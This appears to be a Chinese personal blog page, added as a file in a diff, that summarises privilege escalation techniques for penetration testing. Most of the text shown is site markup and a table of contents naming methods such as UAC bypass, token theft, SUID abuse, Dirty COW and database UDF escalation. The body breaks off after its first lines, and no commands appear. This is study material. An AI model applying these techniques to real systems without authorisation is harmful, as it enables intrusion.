@@ -1,0 +1,853 @@
+<!DOCTYPE html><html lang="en"><head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+<link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin="">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"demoyao100.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="PREFACE：这个是真不太会，赶紧学学…">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透提权总结">
+<meta property="og:url" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Moyao の小屋">
+<meta property="og:description" content="PREFACE：这个是真不太会，赶紧学学…">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165344444-1263387316.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165345724-1823083219.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165346188-456697944.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165346621-908976883.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165347188-2031860445.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165347529-1439309872.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165348118-1951026428.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165348548-2040451659.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165348917-255228848.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165349331-1015014567.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165349775-559246082.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165350108-1640161384.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165350469-809846620.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165350841-1807683012.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165351169-1682951443.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165351505-495496718.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165351871-824825594.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165352226-1488097995.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165352599-1121177084.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165352923-1541900357.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165353205-57489983.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165353471-1410299606.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165353799-254963719.png">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/2096968/202108/2096968-20210819165354233-1421529420.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20240513094825632.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212041598-1644502075.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212042016-1033310053.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212044127-654163967.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212049570-772756241.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212049975-2144042977.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212050205-1914296344.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212050438-1720194396.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212050685-1766592938.png">
+<meta property="og:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212050956-1947031195.png">
+<meta property="article:published_time" content="2024-05-12T09:27:14.000Z">
+<meta property="article:modified_time" content="2024-05-13T07:01:35.498Z">
+<meta property="article:author" content="Moyao">
+<meta property="article:tag" content="pentesting">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165344444-1263387316.png">
+
+
+<link rel="canonical" href="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/","path":"渗透提权总结/","title":"渗透提权总结"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>渗透提权总结 | Moyao の小屋</title>
+  
+    <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-KKC145B2WB"></script>
+  <script class="next-config" data-name="google_analytics" type="application/json">{"tracking_id":"G-KKC145B2WB","only_pageview":false,"measure_protocol_api_secret":null}</script>
+  <script src="/js/third-party/analytics/google-analytics.js"></script>
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope="" itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Moyao の小屋</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Hi,I'm Moyaoxue</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-tags"><a href="/tags.html" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories.html" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-about"><a href="/about.html" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-rss"><a href="/atom.xml" rel="section"><i class="fa fa-rss fa-fw"></i>RSS</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80" placeholder="Searching..." spellcheck="false" type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80-windows"><span class="nav-number">1.</span> <span class="nav-text"> 一、windows</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-windows%E6%9D%83%E9%99%90%E5%88%86%E7%BA%A7"><span class="nav-number">1.1.</span> <span class="nav-text"> 1 windows 权限分级</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%B5%81%E7%A8%8B"><span class="nav-number">1.2.</span> <span class="nav-text"> 2 流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-at%E5%91%BD%E4%BB%A4%E5%88%A9%E7%94%A8-windows2000-windows-2003-windows-xp"><span class="nav-number">1.3.</span> <span class="nav-text"> 3 at 命令利用 Windows2000、Windows 2003、Windows XP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-sc%E5%91%BD%E4%BB%A4%E5%88%A9%E7%94%A8-windows-78-0308-1216"><span class="nav-number">1.4.</span> <span class="nav-text"> 4 sc 命令利用 windows 7/8、03/08、12/16</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-psexec%E6%8F%90%E6%9D%83-win2003-win2008"><span class="nav-number">1.5.</span> <span class="nav-text"> 5 psexec 提权 Win2003、Win2008</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-%E7%BB%95%E8%BF%87uac%E6%8F%90%E6%9D%83-microsoft%E7%9A%84windows-vista-windows-server-2008"><span class="nav-number">1.6.</span> <span class="nav-text"> 6 绕过 UAC 提权 Microsoft 的 Windows Vista、Windows Server 2008</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1%E7%AE%80%E4%BB%8B"><span class="nav-number">1.6.0.1.</span> <span class="nav-text"> （1）简介</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-number">1.6.0.2.</span> <span class="nav-text"> （2）绕过方法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96-2008%E5%8F%8A%E4%BB%A5%E5%89%8D"><span class="nav-number">1.7.</span> <span class="nav-text"> 7 令牌窃取 2008 及以前</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%A4%E7%89%8C%E7%AE%80%E4%BB%8B"><span class="nav-number">1.7.0.1.</span> <span class="nav-text"> 令牌简介</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95"><span class="nav-number">1.7.0.2.</span> <span class="nav-text"> 攻击方法</span></a></li></ol></li></ol><li class="nav-item nav-level-3"><a class="nav-link" href="#8-%E7%83%82%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83-web%E6%9D%83%E9%99%90"><span class="nav-number">1.8.</span> <span class="nav-text"> 8 烂土豆提权 web 权限</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.8.1.</span> <span class="nav-text"> 原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2"><span class="nav-number">1.8.2.</span> <span class="nav-text"> 攻击方法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-%E5%8F%AF%E4%BF%A1%E4%BB%BB%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.9.</span> <span class="nav-text"> 9 可信任服务路径漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-%E4%B8%8D%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E9%85%8D%E5%90%88%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1schtasks%E6%88%96sc%E5%91%BD%E4%BB%A4%E5%88%A9%E7%94%A8"><span class="nav-number">1.10.</span> <span class="nav-text"> 10 不安全服务权限配合计划任务 schtasks 或 SC 命令利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-unattended-installs%E8%87%AA%E5%8A%A8%E5%AE%89%E8%A3%85"><span class="nav-number">1.11.</span> <span class="nav-text"> 10 Unattended Installs（自动安装）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#11-alwaysinstallelevated"><span class="nav-number">1.12.</span> <span class="nav-text"> 11 AlwaysInstallElevated</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-dll%E5%8A%AB%E6%8C%81%E6%8F%90%E6%9D%83"><span class="nav-number">1.13.</span> <span class="nav-text"> 12 DLL 劫持提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-2"><span class="nav-number">1.13.1.</span> <span class="nav-text"> 原理</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-%E5%B8%B8%E7%94%A8%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E-cve-windows10-windows72008-windows78-200820122016-sql-server-iis%E9%80%9A%E6%9D%80-%E9%92%88%E5%AF%B9%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7%E7%9A%84%E4%B8%8D%E8%83%BD%E7%94%A8%E4%BA%8E%E5%9F%9F%E7%94%A8%E6%88%B7"><span class="nav-number">1.14.</span> <span class="nav-text"> 13 常用系统漏洞 CVE Windows10 Windows7/2008 Windows7/8、2008/2012/2016 SQL Server、IIS 通杀 (针对本地用户的，不能用于域用户)</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#windows10"><span class="nav-number">1.14.0.1.</span> <span class="nav-text"> Windows10</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#windows72008"><span class="nav-number">1.14.0.2.</span> <span class="nav-text"> Windows7/2008</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#windows78-200820122016"><span class="nav-number">1.14.0.3.</span> <span class="nav-text"> Windows7/8、2008/2012/2016</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#sql-server-iis%E9%80%9A%E6%9D%80-%E9%92%88%E5%AF%B9%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7%E7%9A%84%E4%B8%8D%E8%83%BD%E7%94%A8%E4%BA%8E%E5%9F%9F%E7%94%A8%E6%88%B7"><span class="nav-number">1.14.0.4.</span> <span class="nav-text"> SQL Server、IIS 通杀 (针对本地用户的，不能用于域用户)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C-linux"><span class="nav-number">2.</span> <span class="nav-text"> 二、linux</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-suid%E6%8F%90%E6%9D%83"><span class="nav-number">2.1.</span> <span class="nav-text"> 1 suid 提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%89%BE%E5%88%B0%E6%9C%89root%E6%9D%83%E9%99%90%E7%9A%84%E7%A8%8B%E5%BA%8F"><span class="nav-number">2.1.1.</span> <span class="nav-text"> （1） 找到有 root 权限的程序</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E5%8F%AF%E7%94%A8%E4%BA%8Esuid%E6%8F%90%E6%9D%83%E7%9A%84%E7%A8%8B%E5%BA%8F"><span class="nav-number">2.1.2.</span> <span class="nav-text"> （2）可用于 suid 提权的程序</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-nmap"><span class="nav-number">2.1.2.1.</span> <span class="nav-text"> ① nmap</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-find"><span class="nav-number">2.1.2.2.</span> <span class="nav-text"> ② find</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-vim"><span class="nav-number">2.1.2.3.</span> <span class="nav-text"> ③ Vim</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-bash"><span class="nav-number">2.1.2.4.</span> <span class="nav-text"> ④ Bash</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-less"><span class="nav-number">2.1.2.5.</span> <span class="nav-text"> ⑤ less</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6-more"><span class="nav-number">2.1.2.6.</span> <span class="nav-text"> ⑥ more</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#7-nano"><span class="nav-number">2.1.2.7.</span> <span class="nav-text"> ⑦ nano</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#8-cpmv"><span class="nav-number">2.1.2.8.</span> <span class="nav-text"> ⑧ cp/mv</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#9-awk"><span class="nav-number">2.1.2.9.</span> <span class="nav-text"> ⑨ awk</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#10-%E5%85%B6%E5%AE%83"><span class="nav-number">2.1.2.10.</span> <span class="nav-text"> ⑩ 其它</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83"><span class="nav-number">2.2.</span> <span class="nav-text"> 2 内核漏洞脏牛提权</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1%E6%9F%A5%E7%9C%8B%E7%89%88%E6%9C%AC"><span class="nav-number">2.2.0.1.</span> <span class="nav-text"> （1）查看版本</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2msf"><span class="nav-number">2.2.0.2.</span> <span class="nav-text"> （2）msf</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3linux-exploit-suggester"><span class="nav-number">2.2.0.3.</span> <span class="nav-text"> （3）linux-exploit-suggester</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="nav-number">2.3.</span> <span class="nav-text"> 3 计划任务提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-sudo%E6%8F%90%E6%9D%83"><span class="nav-number">2.4.</span> <span class="nav-text"> 4 sudo 提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E5%85%8D%E5%AF%86%E7%A0%81"><span class="nav-number">2.4.1.</span> <span class="nav-text"> （1）免密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="nav-number">2.4.2.</span> <span class="nav-text"> （2）密码爆破</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E5%AF%86%E7%A0%81%E5%A4%8D%E7%94%A8"><span class="nav-number">2.5.</span> <span class="nav-text"> 5 密码复用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-nfs%E6%8F%90%E6%9D%83"><span class="nav-number">2.6.</span> <span class="nav-text"> 6 NFS 提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="nav-number">2.7.</span> <span class="nav-text"> 7 数据库提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1udf%E6%8F%90%E6%9D%83"><span class="nav-number">2.7.1.</span> <span class="nav-text"> （1）UDF 提权</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-number">2.7.1.1.</span> <span class="nav-text"> 介绍：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-number">2.7.1.2.</span> <span class="nav-text"> 利用条件：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%89%88%E6%9C%AC%E7%89%B9%E6%80%A7"><span class="nav-number">2.7.1.3.</span> <span class="nav-text"> 版本特性</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2mof%E6%8F%90%E6%9D%83"><span class="nav-number">2.7.2.</span> <span class="nav-text"> （2）MOF 提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83"><span class="nav-number">2.7.3.</span> <span class="nav-text"> （3）启动项提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4cve-2016-6663-cve-2016-6664%E7%BB%84%E5%90%88%E6%8F%90%E6%9D%83"><span class="nav-number">2.7.4.</span> <span class="nav-text"> （4）CVE-2016-6663、CVE-2016-6664 组合提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5%E5%8F%8D%E5%BC%B9%E7%AB%AF%E5%8F%A3%E6%8F%90%E6%9D%83"><span class="nav-number">2.7.5.</span> <span class="nav-text"> （5）反弹端口提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE"><span class="nav-number">3.</span> <span class="nav-text"> 题目</span></a></li></div>
+        </div>
+        
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Moyao" src="/images/avatar.webp">
+  <p class="site-author-name" itemprop="name">Moyao</p>
+  <div class="site-description" itemprop="description">Write down something interesting I met<br>
+Feel free to mail me if you have something wanted to talk about, plz
+mail: &lt;moyaoxue@outlook.com&gt;
+</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">85</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags.html">
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="/moyaoxue@outlook.com" title="E-Mail → moyaoxue@outlook.com" rel="noopener me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope="" itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">
+
+    <span hidden="" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Moyao">
+    </span>
+
+    <span hidden="" itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Moyao の小屋">
+      <meta itemprop="description" content="Write down something interesting I met<br />
+Feel free to mail me if you have something wanted to talk about, plz
+mail: <moyaoxue@outlook.com>
+">
+    </span>
+
+    <span hidden="" itemprop="post" itemscope="" itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="渗透提权总结 | Moyao の小屋">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          渗透提权总结
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2024-05-12 17:27:14" itemprop="dateCreated datePublished" datetime="2024-05-12T17:27:14+08:00">2024-05-12</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>PREFACE：这个是真不太会，赶紧学学…</p>
+<span id="more"></span>
+<h2 id="一-windows"><a class="markdownIt-Anchor" href="#一-windows">#</a> 一、windows</h2>
+<h3 id="1-windows权限分级"><a class="markdownIt-Anchor" href="#1-windows权限分级">#</a> 1 windows 权限分级</h3>
+<p>1.user：普通用户权限，是系统中最安全的权限（因为分配给改组的默认权限不允许成员操作修改操作系统的设置或用户资料）</p>
+<p>2.Administrator： 管理员权限。可以利用 windows 的机制将自己提升为 system 权限，以便操作 SAm 文件</p>
